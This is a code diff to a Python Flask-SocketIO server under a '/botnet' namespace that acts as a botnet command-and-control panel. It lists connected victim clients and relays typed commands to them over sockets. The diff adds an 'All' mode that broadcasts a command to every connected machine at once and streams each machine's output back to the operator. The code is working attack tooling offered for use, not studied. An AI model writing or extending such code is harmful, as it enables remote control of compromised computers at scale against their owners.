@@ -71,6 +71,7 @@ def listen(ip, port):
         for _, addr in clients:
             c.append(str(addr))
         socket_.emit("connected_clients", {'data':c}, namespace="/botnet")
+        print('C: ',c)
         print(f"\n[+] - Server Conneted to client at [{address[0]} ] : [ {address[1]}]")
         socket_.emit('printer', {'data':f'\n[+] - Server Conneted to client at [{address[0]} ] : [ {address[1]}]'}, namespace='/botnet')
         clients.append((conn, address))
@@ -91,20 +92,37 @@ def index():
 @socket_.on("sendMessage", namespace='/botnet')
 def sendMessage(data):
     global clients
-    #print(data)
     message=data['data']
-    #print(message)
-    clients[int(message['client'])][0].send((message['message']+"\n").encode())
-    clients[int(message['client'])][0].settimeout(1)
-    try:
-        d=clients[int(message['client'])][0].recv(4096).decode()
-        d=d.splitlines()
-        emit('printer', {'data': f"\n --- Client: {str(clients[int(message['client'])][1])} ---"})
-        for line in d:
-            emit('printer', {'data':line}, namespace='/botnet')
-    except socket.timeout:
-        print("hello")
-    clients[int(message['client'])][0].settimeout(0)
+    if message['client'] == 'All':
+        print("Clients length: ", len(clients))
+        i = 0
+        for conn, addr in clients:
+            conn.send((message['message']+"\n").encode())
+            conn.settimeout(1)
+            try:
+                d=conn.recv(4096).decode()
+                d=d.splitlines()
+                print(f"\n --- Client [{clients[i][1][0]}] : [{clients[i][1][1]}]'s Output ---\n")
+                emit('printer', {'data': f"\n --- Client [{clients[i][1][0]}] : [{clients[i][1][1]}]'s Output ---\n"});i+=1
+                for line in d:
+                    emit('printer', {'data':line}, namespace='/botnet')
+            except socket.timeout:
+                print("hello")
+            conn.settimeout(0)
+    else:
+        newstr = message['client']
+        getres = int(newstr[len(newstr)-1])
+        clients[getres][0].send((message['message']+"\n").encode())
+        clients[getres][0].settimeout(1)
+        try:
+            d=clients[getres][0].recv(4096).decode()
+            d=d.splitlines()
+            emit('printer', {'data': f"\n --- Client: {str(clients[getres][1])} ---"})
+            for line in d:
+                emit('printer', {'data':line}, namespace='/botnet')
+        except socket.timeout:
+            print("hello")
+        clients[getres][0].settimeout(0)
 
 @socket_.on('parse', namespace='/botnet')
 def parse(data):
